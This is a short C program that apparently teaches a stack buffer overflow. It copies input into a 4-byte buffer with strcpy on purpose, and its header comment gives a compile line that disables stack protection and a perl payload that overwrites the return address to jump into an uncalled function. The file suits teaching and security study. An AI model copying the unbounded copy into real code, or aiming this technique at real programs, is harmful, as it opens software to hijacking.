/*
 *---------------------------------------------------------------------
 * bufover1.c
 *---------------------------------------------------------------------
 *
 * gcc -Wall -pedantic -fno-stack-protector bufover1.c -o bufover1.exe
 *
 * ./bufover1.exe `perl -e 'print "A" x 24 . "\x4e\x06\x40\x00"'`
 * 
 *-------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>


void foo(char *s) {
	char buf[4];

	strcpy(buf, s);
	printf("You entered: %s", buf);
}

void bar() {
	printf("\n\nWhat? I was not supposed to be called!\n\n");
	fflush(stdout);
}

int main(int argc, char *argv[]) {
	if (argc != 2) {
		printf("Usage: %s some_string\n", argv[0]);
		return 2;
	}

	foo(argv[1]);

	return 0;
}
